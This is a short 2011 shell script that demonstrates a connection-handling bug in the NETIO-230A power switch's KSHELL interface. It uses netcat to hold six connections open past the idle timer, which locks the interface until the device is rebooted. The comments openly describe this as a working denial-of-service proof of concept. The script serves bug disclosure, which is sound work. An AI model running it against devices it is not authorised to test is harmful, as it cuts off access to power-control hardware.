#! /bin/sh
#
# Demonstration of a bug in the NETIO-230A KSHELL interface:
#
# Connections that are not closed properly prevent a reuse of this KSHELL
# instance. This can be used for a denial-of-service attack, but even during
# normal use network interruptions can trigger this bug.
#
# The bug is demonstrated by opening, but not closing, 6 KSHELL connections.
#
# A reboot of the NETIO-230A is needed to recover.
#
# Copyright (C) 2011 by Erik Auerswald auerswal@unix-ag.uni-kl.de
#
# Copying and distribution of this file, with or without modification,
# are permitted in any medium without royalty provided the copyright
# notice and this notice are preserved.  This file is offered as-is,
# without any warranty.

# the netcat utility (called 'nc') is needed
which nc > /dev/null || { echo "No 'nc' in \$PATH"; exit 1; }
test $# -eq 1 || { echo "Usage: $(basename $0) IP"; exit 1; }
IP=$1

# set K to the port number of the KSHELL process
K=1234
# set N to the maximum number of concurrent KSHELL connections
N=6

P=""
echo "Opening $N 'nc' connections to $IP"
for i in $(seq $N); do
  nc $IP $K > /dev/null &
  P="$P $!"
  sleep 1
done
sleep 1

echo "Stopping 'nc' processes"
kill -19 $P

# set S to a number of seconds higher than the idle logout timer of KSHELL
S=121
echo "Sleeping $S seconds"
sleep $S
echo "Letting 'nc' processes continue"
kill -18 $P
echo "Killing 'nc' processes"
kill -15 $P
echo "Waiting for 'nc' processes to terminate"
wait
exit 0
